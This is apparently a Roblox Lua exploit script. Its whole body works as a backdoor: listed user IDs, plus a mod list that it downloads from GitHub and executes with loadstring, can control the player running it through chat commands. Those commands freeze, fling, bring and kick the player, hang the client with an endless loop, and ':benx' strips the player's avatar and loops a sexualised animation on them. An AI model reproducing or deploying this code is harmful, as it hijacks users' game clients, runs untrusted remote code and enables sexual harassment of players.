local swagmins = {
  9339381071, -- Mas2n
  3285414653, -- SWAGM0DE
  92157681, -- Ninaly4567
  1688589423, -- KR1STlNA
  2351144328, -- suslevel9999
  1997397874, 
}

local bending = false
local kickmsg = 'PERMA BANNED'
local function commands(msg,plr)
    if DisableMod == false or table.find(swagmins, plr) then
        local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
        local Msg = string.lower(msg)
        local SplitCMD = string.split(Msg,' ')
        local Lower = string.lower(player.Name)
        local Allowed = string.find(Lower, SplitCMD[2])
        if Allowed then
            if string.find(SplitCMD[1], ':freeze') then
                player.Character.HumanoidRootPart.Anchored = true
            end
            if string.find(SplitCMD[1], ':thaw') then
                player.Character.HumanoidRootPart.Anchored = false
            end
            if string.find(SplitCMD[1], ':benx') then
                bending = true
                local segtarget = Mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end;
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end;
                local Pause = function()
                    Loop:Disconnect()
                    Crouch:Stop()
                end;
                Start()	
                repeat wait() until bending == false
                Pause()
            end
            if string.find(SplitCMD[1], ':unbenx') then
                while bending == true do
                    wait()
                    bending = false
                end
            end
            if string.find(SplitCMD[1], ':kick') then
                local ISADMIN = table.find(swagmins, player.UserId)
                if not ISADMIN then
                    kickmsg = Mod.Name
                    player:Kick(kickmsg)
                    wait(5)
                    while true do end
                end
            end
            if string.find(SplitCMD[1], ':bring') then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
            end
            if string.find(SplitCMD[1], ':cuffban') then
                if table.find(swagmins, plr) then
                    local ISADMIN = table.find(swagmins, player.UserId)
                    if not ISADMIN then
                        player:Kick('Stop .')
                    end
                end
            end
            if string.find(SplitCMD[1], ':fling') then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
            end
        else
            if string.find(msg, '/e test') then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yeah,yeah!", 'All');
            end
        end
    end
end

muted = {}
mutingnew = false 

local ModCheck = loadstring(game:HttpGet('https://raw.githubusercontent.com/swagmode/swagmode/main/modlist'))()
Players.PlayerAdded:Connect(function(plr)
    local SWAGMIN = table.find(swagmins, plr.UserId)
    if SWAGMIN or ModCheck[plr.UserId] then
        plr.Chatted:Connect(function(msg)
            commands(msg, plr.UserId)
        end)
    end
    if muteingnew == true then
        if not table.find(muted, plr.Name) then
            table.insert(muted, plr.Name)
            print('automuted ' .. plr.Name)
        end
    end
end)

for i,v in pairs(game:GetService('Players'):GetChildren()) do
    local SWAGMIN = table.find(swagmins, v.UserId)
    if SWAGMIN or ModCheck[v.UserId] then
        print('found')
        v.Chatted:Connect(function(msg)
           commands(msg, v.UserId)
        end)
    end
end
